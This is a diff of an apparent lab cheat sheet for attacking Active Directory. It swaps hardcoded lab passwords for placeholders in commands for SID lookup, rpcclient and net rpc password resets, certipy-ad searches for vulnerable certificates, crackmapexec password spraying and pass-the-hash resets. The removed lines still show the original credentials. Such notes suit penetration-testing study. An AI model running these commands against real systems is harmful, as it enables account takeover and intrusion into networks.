@@ -53,12 +53,12 @@
 - impacket-lookupsid $domain/$user@$machine.$domain -domain-sids
 - impacket-lookupsid vault.offsec/anirudh@$vault.offsec -domain-sids
 - rpcclient -U nagoya-industries/svc_helpdesk 192.168.114.21
-- - rpcclient $> setuserinfo christopher.lewis 23 'Admin!23'
-- rpcclient -U fiona.clark 192.168.114.21 --password=Summer2023 --command="setuserinfo2 svc_helpdesk 23 Password123"
+- - rpcclient $> setuserinfo christopher.lewis 23 'PasswordHere'
+- rpcclient -U fiona.clark 192.168.114.21 --password=PasswordHere --command="setuserinfo2 svc_helpdesk 23 Password123"
 
 #### Certify
 
-- certipy-ad find -u raven -p R4v3nBetD3veloP3r!123 -dc-ip $Ip -stdout -vulnerable
+- certipy-ad find -u raven -p PasswordHere -dc-ip $Ip -stdout -vulnerable
 - certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
 
 #### Spray the network
@@ -75,7 +75,7 @@
 - crackmapexec smb $IP --pass-pol it show the threshold
 - crackmapexec smb $IP -u ' ' -p ' ' --shares
 - crackmapexec smb $IP -u ' ' -p ' ' --users
-- crackmapexec smb 192.168.156.75 -u crackuser.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
+- crackmapexec smb 192.168.156.75 -u crackuser.txt -p 'PasswordHere' -d corp.com --continue-on-success
 
 #### Kerberoasting
 
@@ -171,9 +171,9 @@
 
 ##### AllExtendedRights GetChangesALL
 
-- net rpc password "jackie" "Password2024" -U "DOMAIN"/"lisa"%"LisaWayToGo456" -S "DomainController"
+- net rpc password "jackie" "Password2024" -U "DOMAIN"/"lisa"%"PasswordHere" -S "DomainController"
 - pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
-- net rpc password "jackie" "newPassword2024" -U "sub.poseidon.yzx"/"Lisa"%"LisaWayToGo456" -S "192.168.110.162"
+- net rpc password "jackie" "newPassword2024" -U "sub.poseidon.yzx"/"Lisa"%"PasswordHere" -S "192.168.110.162"
 
 ##### LAPS Readers
 
